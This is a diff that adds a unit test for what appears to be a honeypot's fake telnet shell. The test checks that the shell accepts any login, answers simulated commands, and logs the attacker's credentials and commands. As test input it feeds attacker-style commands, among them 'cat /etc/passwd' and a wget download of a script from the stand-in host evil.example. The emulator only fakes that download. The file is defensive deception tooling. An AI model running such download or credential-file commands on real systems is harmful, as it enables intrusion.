@@ -87,6 +87,38 @@ final class ProtocolEngineTest extends TestCase
         self::assertTrue($s->close);                 // no crypto, no shell — logged + closed
     }
 
+    // --- interactive fake shell (telnet) ---
+
+    public function test_telnet_shell_login_commands_and_logging(): void
+    {
+        $e = $this->emu('telnet');
+        $s = new ProtocolSession(7);
+        $log = [];
+        $cb = function (string $cmd) use (&$log): void {
+            $log[] = $cmd;
+        };
+
+        self::assertStringContainsString('login:', $e->banner($s));
+        self::assertSame('Password: ', $e->feed("root\r\n", $s, $cb));       // username -> password prompt
+        self::assertStringContainsString('Welcome', $e->feed("hunter2\r\n", $s, $cb)); // accept-all login
+
+        self::assertStringContainsString('root', $e->feed("whoami\r\n", $s, $cb));
+        self::assertStringContainsString('root:x:0:0', $e->feed("cat /etc/passwd\r\n", $s, $cb));
+        $e->feed("cd /etc\r\n", $s, $cb);
+        self::assertSame('/etc', $s->cwd);
+        self::assertStringContainsString('passwd', $e->feed("ls\r\n", $s, $cb));
+        // wget returns canned progress but NEVER fetches the URL.
+        self::assertStringContainsString('200 OK', $e->feed("wget http://evil.example/x.sh\r\n", $s, $cb));
+        self::assertStringContainsString('command not found', $e->feed("frobnicate\r\n", $s, $cb));
+        $e->feed("exit\r\n", $s, $cb);
+        self::assertTrue($s->close);
+
+        // The whole session — creds attempted + commands + the wget URL — is captured intel.
+        self::assertContains('hunter2', $log);
+        self::assertContains('cat /etc/passwd', $log);
+        self::assertContains('wget http://evil.example/x.sh', $log);
+    }
+
     // --- codec framing + bounds + safety ---
 
     public function test_resp_partial_frame_waits_for_more_bytes(): void
